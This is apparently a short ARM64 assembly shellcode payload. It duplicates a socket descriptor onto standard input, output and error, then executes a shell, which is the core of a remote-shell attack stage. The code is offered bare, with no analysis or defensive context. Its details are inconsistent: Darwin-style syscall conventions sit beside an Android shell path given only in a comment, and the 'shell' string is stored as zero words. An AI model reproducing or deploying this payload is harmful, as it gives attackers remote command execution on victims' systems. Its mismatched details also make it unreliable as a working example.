.equ SYS_DUP2, 0x5a
.equ SYS_EXECVE, 0x3b
.equ SYS_EXIT, 0x01

.equ STDIN, 0x0
.equ STDOUT, 0x1
.equ STDERR, 0x2

_start:
    /* dup2(sockfd, STDIN) ... */
    mov    x0, x12
    mov    x2, 0
    mov    x1, STDIN
    mov    x16, SYS_DUP2
    svc    0
    mov    x1, STDOUT
    mov    x16, SYS_DUP2
    svc    0
    mov    x1, STDERR
    mov    x16, SYS_DUP2
    svc    0

    /* execve('/system/bin/sh', NULL, NULL) */
    adr    x0, shell
    mov    x2, 0
    str    x0, [sp, 0]
    str    x2, [sp, 8]
    mov    x1, sp
    mov    x16, SYS_EXECVE
    svc    0

exit:
    mov    x0, 0
    mov    x16, SYS_EXIT
    svc    0

.balign 4
shell:
.word 0x00000000
.word 0x00000000
.word 0x00000000
.word 0x00000000
end:

